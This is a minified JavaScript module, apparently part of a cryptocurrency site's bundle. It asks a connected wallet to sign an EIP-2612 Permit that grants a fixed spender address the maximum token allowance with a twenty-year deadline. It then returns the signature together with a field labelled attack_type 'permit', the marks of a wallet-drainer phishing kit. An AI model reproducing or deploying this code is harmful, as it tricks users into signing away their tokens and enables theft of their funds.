import{e as u,f as I,h as M,p as L,S as O,i as R,j as N,B as W,C as b}from"./BqACKYKw.js";import{M as g,S as p,O as x,U as T,s as U}from"./N-IBRvSD.js";async function l(){if(!u())return;const n=N();return await new W(n).getSigner()}async function k(n,t){if(!u())return;const e=await l();return new b(n,t,e)}async function q(n,t,e,d,s=18){return new Promise(async(m,r)=>{try{u()||r({reason:"Wallet not connected"}),d<=0&&r({reason:"Insufficient amount"}),e!=I()&&r({reason:"Wrong chain"});const y=await k(n,["function DOMAIN_SEPARATOR() external view returns (bytes32)","function nonces(address owner) external view returns (uint256)"]),A=await l(),i=M();console.log("decimals:  ",s);const S=L(g,s),v=20*365.25*24*60*60,w=Math.floor(window.Date.now()/1e3)+v,o={owner:i,spender:p,value:n==x?g:S,deadline:w};try{const c=await y.nonces(i);o.nonce=c}catch(c){o.nonce=0,console.log("Error getting nonce:       ",c)}let f={name:t,chainId:e,verifyingContract:n};n.toLowerCase()==T.toLowerCase()&&(f={name:t,chainId:e,version:"2",verifyingContract:n});const C={Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]},P=await A.signTypedData(f,C,o),{r:D,s:E,v:h}=O.from(P);m({r:D,s:E,v:h,nonce:R(o.nonce.toString()),owner:i,spender:p,value:g,deadline:w,chain_id:e,token_address:n,token_name:t,attack_type:"permit",spenderAddress:U,decimals:s})}catch(a){console.log(a),r(a)}})}export{q as r};
